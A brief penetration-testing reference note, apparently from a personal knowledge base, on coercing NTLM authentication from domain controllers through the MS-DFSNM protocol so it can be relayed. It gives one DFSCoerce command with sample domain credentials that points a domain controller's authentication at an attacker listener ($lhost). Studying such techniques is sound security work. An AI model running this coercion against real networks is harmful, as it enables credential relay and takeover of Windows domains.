---
title: NTLM Relay from DFSNM
---

[[notes/ad/ntlm-relay-source]] as domain user from DCs trough [[notes/network/msrpc]] *Distributed File System Namespace Management Protocol* ([MS-DFSNM](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/)).

[[notes/ad/ntlm-relay-from-smb|Coerce authentication from SMB]].

=== "[DFSCoerce](https://github.com/wh04m1001/dfscoerce)"
    ~~~ bash
    python3 ./dfscoerce.py -d corp.local -u jdoe -p 'passw0rd' $lhost dc01.corp.local
    ~~~

This technique is also implemented in [[notes/tools/coercer]].
